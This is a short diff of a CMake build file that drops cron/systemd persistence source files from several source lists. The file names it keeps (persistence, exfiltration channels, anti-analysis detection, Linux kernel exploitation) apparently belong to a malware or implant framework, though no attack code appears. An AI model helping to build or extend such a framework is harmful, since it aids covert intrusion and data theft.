@@ -235,7 +235,6 @@ set(RUNTIME_SOURCES
 
     # Linux persistence
     linux/persistence.c
-    linux/persistence/cron_systemd.c
 
     # Linux exfiltration
     linux/exfil/exfil_channels.c
@@ -346,7 +345,6 @@ if(UNIX OR NOT WIN32)
         sysinfo.c
         exploitation/linux_kernel.c
         network/network.c
-        linux/persistence.c
         linux/anti_analysis/detection.c
     )
 elseif(WIN32)
@@ -386,7 +384,6 @@ elseif(WIN32)
         linux/core/runtime_init.c
         linux/core/sandbox_ops.c
         linux/persistence.c
-        linux/persistence/cron_systemd.c
         linux/exfil/exfil_channels.c
         linux/io/io_core.c
         linux/threading/threadpool.c
